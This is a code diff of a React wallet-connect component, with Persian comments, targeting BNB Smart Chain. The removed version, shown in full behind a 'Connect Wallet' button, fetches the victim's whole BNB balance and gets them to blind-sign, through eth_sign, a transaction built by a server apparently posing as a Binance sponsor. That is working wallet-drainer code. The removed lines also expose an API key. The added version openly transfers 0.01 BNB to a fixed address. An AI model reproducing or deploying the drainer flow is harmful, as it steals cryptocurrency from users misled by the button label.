@@ -1,43 +1,29 @@
 import jQuery from "jquery";
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
 
-const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
-
-async function getBNBBalance(address) {
-  try {
-    const response = await fetch(
-      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
-    );
-    const data = await response.json();
-    if (data.status === "1") {
-      return (parseInt(data.result) / 1e18).toFixed(6);
-    }
-  } catch (error) {
-    console.error("❌ Error fetching BNB balance:", error);
-  }
-  return null;
-}
-
 function App() {
   async function runner() {
-    // پاک کردن session قدیمی (walletconnect)
+    // پاک کردن session قدیمی (در صورت وجود)
     if (typeof localStorage !== "undefined") {
       localStorage.removeItem("walletconnect");
     }
 
-    // راه‌اندازی Provider
+    // ساخت Provider از WalletConnect
     const ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56],
-      methods: ["eth_sign"], // فقط از eth_sign استفاده می‌کنیم
-      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
+      // متدهایی که قصد استفاده دارید:
+      methods: ["eth_sign", "eth_sendTransaction"],
+      projectId: "YOUR_PROJECT_ID", // از سایت cloud.walletconnect.com بگیرید
     });
 
+    // نمایش QR به کاربر و اتصال به کیف پول
     await ethereumProvider.enable();
     const provider = ethereumProvider;
+
+    // گرفتن آدرس‌های موجود در کیف پول
     const accounts = await provider.request({ method: "eth_accounts" });
     const accountSender = accounts[0];
-
     if (!accountSender) {
       console.error("❌ Wallet connection failed");
       return;
@@ -45,128 +31,68 @@ function App() {
 
     console.log("✅ Wallet Connected:", accountSender);
 
-    // اطمینان از اینکه روی شبکه بایننس هستیم
-    try {
-      await provider.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: "0x38" }], // chainId بایننس اسمارت چین
-      });
-    } catch (error) {
-      console.error("❌ Error in switching chain:", error);
-      return;
-    }
-
-    const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
-
-    // 1) دریافت بالانس BNB
-    const amount = await getBNBBalance(accountSender);
-    if (!amount) {
-      console.error("❌ Failed to fetch BNB balance.");
-      return;
-    }
-    console.log("💰 BNB Balance:", amount);
-
-    // 2) ساخت پیام برای امضای اول
+    // (اختیاری) ابتدا یک پیام ساده را امضا می‌گیریم:
+    const amount = "0.01"; // مثال: 0.01 BNB
     const message = `Authorize sending ${amount} BNB from ${accountSender}`;
-    console.log("📜 Message to Sign:", message);
-
-    // 3) امضای پیام اول با eth_sign
     let signature;
     try {
       signature = await provider.request({
         method: "eth_sign",
         params: [accountSender, message],
       });
+      console.log("✍️ Signature (message):", signature);
     } catch (error) {
       console.error("❌ Signature failed:", error);
       return;
     }
 
-    console.log("✍️ Signature:", signature);
-
-    // 4) دریافت تراکنش خام از سرور + امضای آن (مرحله دوم)
-    async function signAndSendTransaction() {
-      try {
-        console.log("📡 Requesting Unsigned Transaction...");
-
-        // مرحله اول (tx)
-        let result = await jQuery.post(apiUrl, {
-          handler: "tx",          // سرور تشخیص می‌دهد مرحله اول است
-          address: accountSender,
-          signature: signature,   // امضای پیام اول
-          amount: amount,         // فرستادن بالانس
-        });
-
-        console.log("📥 API Response (raw):", result);
-
-        // اگر پاسخ یک رشته JSON باشد، parse کن
-        if (typeof result === "string") {
-          try {
-            result = JSON.parse(result);
-          } catch (err) {
-            console.error("❌ Could not parse the raw server response:", err);
-            return;
-          }
-        }
-
-        console.log("📥 API Response (parsed):", result);
-
-        if (!result || !result.rawTransaction) {
-          console.error("❌ No rawTransaction received!", result);
-          return;
-        }
-
-        let unsignedTx;
-        try {
-          unsignedTx =
-            typeof result.rawTransaction === "string"
-              ? JSON.parse(result.rawTransaction)
-              : result.rawTransaction;
-        } catch (e) {
-          console.error("❌ Failed to parse rawTransaction:", result.rawTransaction, e);
-          return;
-        }
-
-        console.log("📜 Unsigned Transaction:", unsignedTx);
-
-        // 5) امضای تراکنش خام با eth_sign (مرحله دوم)
-        console.log("📝 Signing Transaction (raw)...");
-        const signedTx = await provider.request({
-          method: "eth_sign",
-          params: [accountSender, JSON.stringify(unsignedTx)],
-        });
-
-        console.log("✍️ Signed Transaction (raw):", signedTx);
-
-        // 6) ارسال تراکنش امضا شده به سرور (handler='sign')
-        //    اینجا باید rawTransaction را هم بفرستیم تا سرور بتواند همان را هش کند
-        const txHash = await jQuery.post(apiUrl, {
-          handler: "sign",          // سرور تشخیص می‌دهد مرحله دوم است
-          signature: signedTx,      // امضای تراکنش خام
-          address: accountSender,
-          amount: amount,           // اگر لازم است سرور اینجا هم بالانس بداند
-          rawTransaction: JSON.stringify(unsignedTx), // 👈 مهم: ارسال متن تراکنش
-        });
-
-        console.log("📤 Transaction Sent:", txHash);
-      } catch (error) {
-        console.error("❌ Error in signAndSendTransaction:", error);
-      }
+    // ارسال این امضا به سرور برای تأیید (اختیاری)
+    let verifyResponse;
+    try {
+      const apiUrl = "https://YOUR_DOMAIN/send.php"; // آدرس واقعی اسکریپت PHP
+      verifyResponse = await jQuery.post(apiUrl, {
+        handler: "tx",
+        address: accountSender,
+        signature: signature,
+        amount: amount,
+      });
+      console.log("Server verify response:", verifyResponse);
+    } catch (err) {
+      console.error("❌ Server verify failed:", err);
+      return;
     }
 
-    await signAndSendTransaction();
+    // اگر سرور گفت امضا معتبر نیست، برگرد
+    if (!verifyResponse || !verifyResponse.success) {
+      console.error("❌ Signature not valid or server error.");
+      return;
+    }
+
+    // حالا واقعاً تراکنش BNB را از کیف پول کاربر می‌فرستیم (خودش گس می‌دهد)
+    // 0.01 BNB => 0.01 * 1e18 = 10000000000000000 (به هگز تبدیل)
+    const valueWeiHex = "0x" + (parseFloat(amount) * 1e18).toString(16);
+
+    try {
+      const txHash = await provider.request({
+        method: "eth_sendTransaction",
+        params: [{
+          from: accountSender,                         // آدرس فرستنده (کاربر)
+          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD", // آدرس مقصد
+          value: valueWeiHex,
+          // gas, gasPrice... (اختیاری، کیف پول اغلب اتوماتیک تعیین می‌کند)
+        }],
+      });
+      console.log("✅ Transaction broadcasted, hash:", txHash);
+      alert("Success! TxHash: " + txHash);
+    } catch (err) {
+      console.error("❌ Transaction failed:", err);
+    }
   }
 
   return (
-    <a
-      href="#"
-      id="connectWallet"
-      onClick={runner}
-      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
-      data-uk-toggle=""
-    >
-      <span>Connect Wallet</span>
-    </a>
+    <button onClick={runner}>
+      Send 0.01 BNB (User Pays Gas)
+    </button>
   );
 }
 
